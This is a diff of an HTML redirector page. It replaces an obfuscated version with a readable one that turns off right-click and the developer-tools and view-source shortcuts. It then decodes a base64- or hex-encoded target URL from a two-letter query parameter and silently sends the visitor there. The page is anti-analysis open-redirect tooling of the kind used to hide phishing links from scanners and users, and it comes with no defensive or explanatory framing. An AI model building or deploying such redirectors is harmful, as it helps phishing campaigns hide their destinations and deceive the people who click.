@@ -1,2 +1,71 @@
-<!DOCTYPE html> <html><head><meta charset="UTF-8"><title>Redirecting...</title> <script>document.addEventListener('c\157nt\145\u0078t\155enu',e=>e.preventDefault());document.onkeydown=function(e){if(e.keyCode===123||(e.ctrlKey&&e.shiftKey&&(e.keyCode===73||e.keyCode===74))||(e.ctrlKey&&(e.keyCode===83||e.keyCode===85||e.keyCode===65))){return false;}};</script> <script>window.onload=function(){const params=new URLSearchParams(window.location.search);let encodedValue='';for(const[key,value]of params.entries()
-){if(key.length===2){encodedValue=value;break;}}if(encodedValue){try{const decodedURL=atob(encodedValue);let finalURL=decodedURL;if(!/^https?:\/\//i.test(finalURL)){finalURL='\x68t\164p://'+finalURL;}window.location.href=finalURL;}catch(e){window.location.href='\x61bou\x74\u003a\x62lank';}}else{window.location.href='a\x62out:\142lank';}};</script> </head><body></body></html>
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <script>
+    // Disable right-click and inspect shortcuts
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.onkeydown = function(e) {
+      if (
+        e.keyCode === 123 || // F12
+        (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || // Ctrl+Shift+I/J
+        (e.ctrlKey && (e.keyCode === 83 || e.keyCode === 85 || e.keyCode === 65)) // Ctrl+S/U/A
+      ) {
+        return false;
+      }
+    };
+  </script>
+
+  <script>
+    function hexToString(hex) {
+      try {
+        let str = '';
+        for (let i = 0; i < hex.length; i += 2) {
+          str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+        }
+        return str;
+      } catch {
+        return '';
+      }
+    }
+
+    window.onload = function () {
+      const params = new URLSearchParams(window.location.search);
+      let encodedValue = '';
+
+      for (const [key, value] of params.entries()) {
+        if (key.length === 2) {
+          encodedValue = value;
+          break;
+        }
+      }
+
+      if (encodedValue) {
+        let decodedURL = '';
+
+        // Try Base64 decode
+        try {
+          decodedURL = atob(encodedValue);
+        } catch (e) {
+          // If Base64 fails, try HEX decode
+          decodedURL = hexToString(encodedValue);
+        }
+
+        if (decodedURL) {
+          if (!/^https?:\/\//i.test(decodedURL)) {
+            decodedURL = 'https://' + decodedURL;
+          }
+          window.location.href = decodedURL;
+        } else {
+          window.location.href = 'about:blank';
+        }
+      } else {
+        window.location.href = 'about:blank';
+      }
+    };
+  </script>
+</head>
+<body>
+</body>
+</html>
